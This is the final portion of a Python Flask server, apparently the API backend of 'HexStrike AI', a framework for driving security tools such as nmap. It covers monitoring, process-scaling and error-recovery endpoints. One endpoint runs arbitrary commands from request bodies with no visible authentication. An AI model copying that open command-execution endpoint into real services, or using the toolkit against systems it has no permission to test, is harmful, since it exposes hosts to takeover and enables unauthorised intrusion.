    """Get current system resource usage and trends"""
    try:
        current_usage = enhanced_process_manager.resource_monitor.get_current_usage()
        usage_trends = enhanced_process_manager.resource_monitor.get_usage_trends()

        logger.info(f"📈 Resource usage retrieved | CPU: {current_usage['cpu_percent']:.1f}% | Memory: {current_usage['memory_percent']:.1f}%")
        return jsonify({
            "success": True,
            "current_usage": current_usage,
            "usage_trends": usage_trends,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting resource usage: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/performance-dashboard", methods=["GET"])
def get_performance_dashboard():
    """Get performance dashboard data"""
    try:
        dashboard_data = enhanced_process_manager.performance_dashboard.get_summary()
        pool_stats = enhanced_process_manager.process_pool.get_pool_stats()
        resource_usage = enhanced_process_manager.resource_monitor.get_current_usage()

        # Create comprehensive dashboard
        dashboard = {
            "performance_summary": dashboard_data,
            "process_pool": pool_stats,
            "resource_usage": resource_usage,
            "cache_stats": enhanced_process_manager.cache.get_stats(),
            "auto_scaling_status": enhanced_process_manager.auto_scaling_enabled,
            "system_health": {
                "cpu_status": "healthy" if resource_usage["cpu_percent"] < 80 else "warning" if resource_usage["cpu_percent"] < 95 else "critical",
                "memory_status": "healthy" if resource_usage["memory_percent"] < 85 else "warning" if resource_usage["memory_percent"] < 95 else "critical",
                "disk_status": "healthy" if resource_usage["disk_percent"] < 90 else "warning" if resource_usage["disk_percent"] < 98 else "critical"
            }
        }

        logger.info(f"📊 Performance dashboard retrieved | Success rate: {dashboard_data.get('success_rate', 0):.1f}%")
        return jsonify({
            "success": True,
            "dashboard": dashboard,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting performance dashboard: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/terminate-gracefully/<int:pid>", methods=["POST"])
def terminate_process_gracefully(pid):
    """Terminate process with graceful degradation"""
    try:
        params = request.json or {}
        timeout = params.get("timeout", 30)

        success = enhanced_process_manager.terminate_process_gracefully(pid, timeout)

        if success:
            logger.info(f"✅ Process {pid} terminated gracefully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} terminated successfully",
                "pid": pid,
                "timestamp": datetime.now().isoformat()
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to terminate process {pid}",
                "pid": pid,
                "timestamp": datetime.now().isoformat()
            }), 400

    except Exception as e:
        logger.error(f"💥 Error terminating process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/auto-scaling", methods=["POST"])
def configure_auto_scaling():
    """Configure auto-scaling settings"""
    try:
        params = request.json
        enabled = params.get("enabled", True)
        thresholds = params.get("thresholds", {})

        # Update auto-scaling configuration
        enhanced_process_manager.auto_scaling_enabled = enabled

        if thresholds:
            enhanced_process_manager.resource_thresholds.update(thresholds)

        logger.info(f"⚙️ Auto-scaling configured | Enabled: {enabled}")
        return jsonify({
            "success": True,
            "auto_scaling_enabled": enabled,
            "resource_thresholds": enhanced_process_manager.resource_thresholds,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error configuring auto-scaling: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/scale-pool", methods=["POST"])
def manual_scale_pool():
    """Manually scale the process pool"""
    try:
        params = request.json
        action = params.get("action", "")  # "up" or "down"
        count = params.get("count", 1)

        if action not in ["up", "down"]:
            return jsonify({"error": "Action must be 'up' or 'down'"}), 400

        current_stats = enhanced_process_manager.process_pool.get_pool_stats()
        current_workers = current_stats["active_workers"]

        if action == "up":
            max_workers = enhanced_process_manager.process_pool.max_workers
            if current_workers + count <= max_workers:
                enhanced_process_manager.process_pool._scale_up(count)
                new_workers = current_workers + count
                message = f"Scaled up by {count} workers"
            else:
                return jsonify({"error": f"Cannot scale up: would exceed max workers ({max_workers})"}), 400
        else:  # down
            min_workers = enhanced_process_manager.process_pool.min_workers
            if current_workers - count >= min_workers:
                enhanced_process_manager.process_pool._scale_down(count)
                new_workers = current_workers - count
                message = f"Scaled down by {count} workers"
            else:
                return jsonify({"error": f"Cannot scale down: would go below min workers ({min_workers})"}), 400

        logger.info(f"📏 Manual scaling | {message} | Workers: {current_workers} → {new_workers}")
        return jsonify({
            "success": True,
            "message": message,
            "previous_workers": current_workers,
            "current_workers": new_workers,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error scaling pool: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/health-check", methods=["GET"])
def process_health_check():
    """Comprehensive health check of the process management system"""
    try:
        # Get all system stats
        comprehensive_stats = enhanced_process_manager.get_comprehensive_stats()

        # Determine overall health
        resource_usage = comprehensive_stats["resource_usage"]
        pool_stats = comprehensive_stats["process_pool"]
        cache_stats = comprehensive_stats["cache"]

        health_score = 100
        issues = []

        # CPU health
        if resource_usage["cpu_percent"] > 95:
            health_score -= 30
            issues.append("Critical CPU usage")
        elif resource_usage["cpu_percent"] > 80:
            health_score -= 15
            issues.append("High CPU usage")

        # Memory health
        if resource_usage["memory_percent"] > 95:
            health_score -= 25
            issues.append("Critical memory usage")
        elif resource_usage["memory_percent"] > 85:
            health_score -= 10
            issues.append("High memory usage")

        # Disk health
        if resource_usage["disk_percent"] > 98:
            health_score -= 20
            issues.append("Critical disk usage")
        elif resource_usage["disk_percent"] > 90:
            health_score -= 5
            issues.append("High disk usage")

        # Process pool health
        if pool_stats["queue_size"] > 50:
            health_score -= 15
            issues.append("High task queue backlog")

        # Cache health
        if cache_stats["hit_rate"] < 30:
            health_score -= 10
            issues.append("Low cache hit rate")

        health_score = max(0, health_score)

        # Determine status
        if health_score >= 90:
            status = "excellent"
        elif health_score >= 75:
            status = "good"
        elif health_score >= 50:
            status = "fair"
        elif health_score >= 25:
            status = "poor"
        else:
            status = "critical"

        health_report = {
            "overall_status": status,
            "health_score": health_score,
            "issues": issues,
            "system_stats": comprehensive_stats,
            "recommendations": []
        }

        # Add recommendations based on issues
        if "High CPU usage" in issues:
            health_report["recommendations"].append("Consider reducing concurrent processes or upgrading CPU")
        if "High memory usage" in issues:
            health_report["recommendations"].append("Clear caches or increase available memory")
        if "High task queue backlog" in issues:
            health_report["recommendations"].append("Scale up process pool or optimize task processing")
        if "Low cache hit rate" in issues:
            health_report["recommendations"].append("Review cache TTL settings or increase cache size")

        logger.info(f"🏥 Health check completed | Status: {status} | Score: {health_score}/100")
        return jsonify({
            "success": True,
            "health_report": health_report,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in health check: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# BANNER AND STARTUP CONFIGURATION
# ============================================================================

# ============================================================================
# INTELLIGENT ERROR HANDLING API ENDPOINTS
# ============================================================================

@app.route("/api/error-handling/statistics", methods=["GET"])
def get_error_statistics():
    """Get error handling statistics"""
    try:
        stats = error_handler.get_error_statistics()
        return jsonify({
            "success": True,
            "statistics": stats,
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"Error getting error statistics: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/test-recovery", methods=["POST"])
def test_error_recovery():
    """Test error recovery system with simulated failures"""
    try:
        data = request.get_json()
        tool_name = data.get("tool_name", "nmap")
        error_type = data.get("error_type", "timeout")
        target = data.get("target", "example.com")

        # Simulate an error for testing
        if error_type == "timeout":
            exception = TimeoutError("Simulated timeout error")
        elif error_type == "permission_denied":
            exception = PermissionError("Simulated permission error")
        elif error_type == "network_unreachable":
            exception = ConnectionError("Simulated network error")
        else:
            exception = Exception(f"Simulated {error_type} error")

        context = {
            "target": target,
            "parameters": data.get("parameters", {}),
            "attempt_count": 1
        }

        # Get recovery strategy
        recovery_strategy = error_handler.handle_tool_failure(tool_name, exception, context)

        return jsonify({
            "success": True,
            "recovery_strategy": {
                "action": recovery_strategy.action.value,
                "parameters": recovery_strategy.parameters,
                "max_attempts": recovery_strategy.max_attempts,
                "success_probability": recovery_strategy.success_probability,
                "estimated_time": recovery_strategy.estimated_time
            },
            "error_classification": error_handler.classify_error(str(exception), exception).value,
            "alternative_tools": error_handler.tool_alternatives.get(tool_name, []),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error testing recovery system: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/fallback-chains", methods=["GET"])
def get_fallback_chains():
    """Get available fallback tool chains"""
    try:
        operation = request.args.get("operation", "")
        failed_tools = request.args.getlist("failed_tools")

        if operation:
            fallback_chain = degradation_manager.create_fallback_chain(operation, failed_tools)
            return jsonify({
                "success": True,
                "operation": operation,
                "fallback_chain": fallback_chain,
                "is_critical": degradation_manager.is_critical_operation(operation),
                "timestamp": datetime.now().isoformat()
            })
        else:
            return jsonify({
                "success": True,
                "available_operations": list(degradation_manager.fallback_chains.keys()),
                "critical_operations": list(degradation_manager.critical_operations),
                "timestamp": datetime.now().isoformat()
            })

    except Exception as e:
        logger.error(f"Error getting fallback chains: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/execute-with-recovery", methods=["POST"])
def execute_with_recovery_endpoint():
    """Execute a command with intelligent error handling and recovery"""
    try:
        data = request.get_json()
        tool_name = data.get("tool_name", "")
        command = data.get("command", "")
        parameters = data.get("parameters", {})
        max_attempts = data.get("max_attempts", 3)
        use_cache = data.get("use_cache", True)

        if not tool_name or not command:
            return jsonify({"error": "tool_name and command are required"}), 400

        # Execute command with recovery
        result = execute_command_with_recovery(
            tool_name=tool_name,
            command=command,
            parameters=parameters,
            use_cache=use_cache,
            max_attempts=max_attempts
        )

        return jsonify({
            "success": result.get("success", False),
            "result": result,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error executing command with recovery: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/classify-error", methods=["POST"])
def classify_error_endpoint():
    """Classify an error message"""
    try:
        data = request.get_json()
        error_message = data.get("error_message", "")

        if not error_message:
            return jsonify({"error": "error_message is required"}), 400

        error_type = error_handler.classify_error(error_message)
        recovery_strategies = error_handler.recovery_strategies.get(error_type, [])

        return jsonify({
            "success": True,
            "error_type": error_type.value,
            "recovery_strategies": [
                {
                    "action": strategy.action.value,
                    "parameters": strategy.parameters,
                    "success_probability": strategy.success_probability,
                    "estimated_time": strategy.estimated_time
                }
                for strategy in recovery_strategies
            ],
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error classifying error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/parameter-adjustments", methods=["POST"])
def get_parameter_adjustments():
    """Get parameter adjustments for a tool and error type"""
    try:
        data = request.get_json()
        tool_name = data.get("tool_name", "")
        error_type_str = data.get("error_type", "")
        original_params = data.get("original_params", {})

        if not tool_name or not error_type_str:
            return jsonify({"error": "tool_name and error_type are required"}), 400

        # Convert string to ErrorType enum
        try:
            error_type = ErrorType(error_type_str)
        except ValueError:
            return jsonify({"error": f"Invalid error_type: {error_type_str}"}), 400

        adjusted_params = error_handler.auto_adjust_parameters(tool_name, error_type, original_params)

        return jsonify({
            "success": True,
            "tool_name": tool_name,
            "error_type": error_type.value,
            "original_params": original_params,
            "adjusted_params": adjusted_params,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error getting parameter adjustments: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/alternative-tools", methods=["GET"])
def get_alternative_tools():
    """Get alternative tools for a given tool"""
    try:
        tool_name = request.args.get("tool_name", "")

        if not tool_name:
            return jsonify({"error": "tool_name parameter is required"}), 400

        alternatives = error_handler.tool_alternatives.get(tool_name, [])

        return jsonify({
            "success": True,
            "tool_name": tool_name,
            "alternatives": alternatives,
            "has_alternatives": len(alternatives) > 0,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error getting alternative tools: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Create the banner after all classes are defined
BANNER = ModernVisualEngine.create_banner()

if __name__ == "__main__":
    # Display the beautiful new banner
    print(BANNER)

    parser = argparse.ArgumentParser(description="Run the HexStrike AI API Server")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--port", type=int, default=API_PORT, help=f"Port for the API server (default: {API_PORT}) i.e export HEXSTRIKE_PORT=8888")
    parser.add_argument("--host", type=str, default=API_HOST, help=f"Host for the API server (default: {API_HOST}) i.e export HEXSTRIKE_HOST=0.0.0.0")

    args = parser.parse_args()

    if args.debug:
        DEBUG_MODE = True
        logger.setLevel(logging.DEBUG)

    if args.port != API_PORT:
        API_PORT = args.port

    if args.host != API_HOST:
        API_HOST = args.host

    # Enhanced startup messages with beautiful formatting
    startup_info = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🚀 Starting HexStrike AI Tools API Server{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}🌐 Port:{ModernVisualEngine.COLORS['RESET']} {API_PORT}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}🔧 Debug Mode:{ModernVisualEngine.COLORS['RESET']} {DEBUG_MODE}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}💾 Cache Size:{ModernVisualEngine.COLORS['RESET']} {CACHE_SIZE} | TTL: {CACHE_TTL}s
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['TERMINAL_GRAY']}⏱️  Command Timeout:{ModernVisualEngine.COLORS['RESET']} {COMMAND_TIMEOUT}s
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['MATRIX_GREEN']}✨ Enhanced Visual Engine:{ModernVisualEngine.COLORS['RESET']} Active
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""

    for line in startup_info.strip().split('\n'):
        if line.strip():
            logger.info(line)

    app.run(host=API_HOST, port=API_PORT, debug=DEBUG_MODE)
